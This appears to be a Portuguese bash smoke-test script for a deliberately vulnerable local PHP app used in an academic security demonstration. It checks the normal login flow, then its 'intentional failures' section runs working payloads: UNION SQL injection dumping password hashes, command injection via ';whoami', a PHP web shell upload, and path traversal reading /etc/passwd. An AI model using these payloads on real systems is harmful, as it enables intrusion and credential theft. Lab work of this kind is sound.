#!/bin/bash
# Ensaio do ambiente antes da banca: fluxo normal + falhas intencionais (smoke tests).
set -uo pipefail

base=http://localhost:8080
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
falhas=0

ok() {
  echo "[OK] $*"
}

erro() {
  echo "[ERRO] $*"
  falhas=$((falhas + 1))
}

codigo_http() {
  curl -s -o /dev/null -w "%{http_code}" "$1"
}

novo_jar() {
  jar=$(mktemp)
  echo "$jar"
}

login() {
  local jar=$1 email=$2 senha=$3
  curl -s -c "$jar" -b "$jar" -o /dev/null \
    -d "email=${email}&senha=${senha}" \
    "$base/login.php"
}

echo "=== USP Avisos — verificação para demonstração ==="
echo "URL base: $base"
echo ""

# --- Ambiente Docker (opcional, mas útil antes da prova) ---
if command -v docker >/dev/null 2>&1; then
  if (cd "$ROOT" && docker compose ps --status running 2>/dev/null | grep -q '\bweb\b'); then
    ok "Container web em execução (docker compose)"
  else
    erro "Container web em execução (rode: docker compose up -d --build)"
  fi
  if versao=$(cd "$ROOT" && docker compose exec -T web php -v 2>/dev/null | head -1); then
    if printf '%s' "$versao" | grep -q '5\.6\.40'; then
      ok "PHP 5.6.40 no container ($versao)"
    else
      erro "PHP 5.6.40 no container (obtido: $versao)"
    fi
  else
    erro "Não foi possível executar php -v no container web"
  fi
else
  echo "[AVISO] docker não encontrado no PATH — pulando checagens de container"
fi

echo ""
echo "--- Fluxo normal (tour da banca) ---"

jar=$(novo_jar)
trap 'rm -f "$jar" "${tmpphp:-}" "${avisos_tmp:-}"' EXIT

codigo=$(codigo_http "$base/login.php")
if test "$codigo" = "200"; then
  ok "Página de login responde (HTTP $codigo)"
else
  erro "Página de login responde (HTTP $codigo, esperado 200)"
fi

login "$jar" "ivan@avisos.br" "aviso123"
avisos_tmp=$(mktemp)
apos_login=$(curl -s -c "$jar" -b "$jar" -w "%{http_code}" -o "$avisos_tmp" "$base/avisos.php")
if test "$apos_login" = "200" && grep -q 'Publicar' "$avisos_tmp"; then
  ok "Login Ivan (senha correta) e acesso a Avisos"
else
  erro "Login Ivan (senha correta) e acesso a Avisos (HTTP $apos_login)"
fi

marca=$(date +%s)
curl -s -c "$jar" -b "$jar" -o /dev/null \
  -d "titulo=Aviso+teste+${marca}&corpo=Texto+do+aviso+de+verificacao+${marca}" \
  "$base/publicar.php"

corpo=$(curl -s -c "$jar" -b "$jar" "$base/avisos.php")
if printf '%s' "$corpo" | grep -q "Aviso teste ${marca}"; then
  ok "Publicar aviso e título visível na listagem"
else
  erro "Publicar aviso e título visível na listagem"
fi

if printf '%s' "$corpo" | grep -q 'Ivan'; then
  ok "Listagem mostra o autor Ivan"
else
  erro "Listagem mostra o autor Ivan"
fi

for pagina in impressora.php modelo.php anexo.php usuario.php; do
  c=$(curl -s -c "$jar" -b "$jar" -o /dev/null -w "%{http_code}" "$base/$pagina")
  if test "$c" = "200"; then
    ok "Menu autenticado: $pagina (HTTP $c)"
  else
    erro "Menu autenticado: $pagina (HTTP $c, esperado 200)"
  fi
done

usuario_html=$(curl -s -c "$jar" -b "$jar" "$base/usuario.php")
if printf '%s' "$usuario_html" | grep -q 'ivan@avisos.br'; then
  ok "Meu usuário exibe e-mail de Ivan"
else
  erro "Meu usuário exibe e-mail de Ivan"
fi

echo ""
echo "--- Falhas intencionais (roteiro de ataque / prova) ---"

sql_out=$(curl -s -c "$jar" -b "$jar" -G --data-urlencode \
  "q=x' UNION SELECT id, email, senha_hash, NOW(), nome FROM usuarios#" \
  "$base/avisos.php")
if printf '%s' "$sql_out" | grep -qE '\$2y\$|senha_hash|daniel@avisos\.br'; then
  ok "SQL injection na busca expõe dados de usuarios (UNION)"
else
  erro "SQL injection na busca expõe dados de usuarios (UNION)"
fi

jar_daniel=$(novo_jar)
login "$jar_daniel" "daniel@avisos.br" "senha-errada-123"
daniel_html=$(curl -s -c "$jar_daniel" -b "$jar_daniel" "$base/usuario.php")
if printf '%s' "$daniel_html" | grep -q 'Daniel' && printf '%s' "$daniel_html" | grep -q 'daniel@avisos.br'; then
  ok "Autenticação fraca: Daniel entra com senha incorreta"
else
  erro "Autenticação fraca: Daniel entra com senha incorreta"
fi
rm -f "$jar_daniel"

cmd_out=$(curl -s -c "$jar" -b "$jar" -d 'host=127.0.0.1;+whoami' "$base/impressora.php")
if printf '%s' "$cmd_out" | grep -qi 'www-data'; then
  ok "Injeção de comando na Impressora (whoami → www-data)"
else
  erro "Injeção de comando na Impressora (whoami → www-data)"
fi

tmpphp=$(mktemp)
nom="fluxo-probe-${marca}.php"
printf '%s\n' '<?php echo shell_exec($_GET["c"]); ?>' > "$tmpphp"
curl -s -c "$jar" -b "$jar" -F "arquivo=@${tmpphp};filename=${nom}" "$base/anexo.php" >/dev/null
shell_out=$(curl -s "$base/anexos/${nom}?c=id")
if printf '%s' "$shell_out" | grep -q 'uid='; then
  ok "Upload executável: web shell em anexos/${nom}"
else
  erro "Upload executável: web shell em anexos/${nom}"
fi

lfi_out=$(curl -s -c "$jar" -b "$jar" "$base/modelo.php?modelo=../../../../etc/passwd")
if printf '%s' "$lfi_out" | grep -q 'root:'; then
  ok "LFI em modelos lê /etc/passwd"
else
  erro "LFI em modelos lê /etc/passwd"
fi

echo ""
if test "$falhas" -eq 0; then
  echo "=== RESULTADO: todos os testes passaram — ambiente pronto para a demonstração ==="
  exit 0
else
  echo "=== RESULTADO: ${falhas} teste(s) falharam — corrija antes da prova (ver [ERRO] acima) ==="
  exit 1
fi
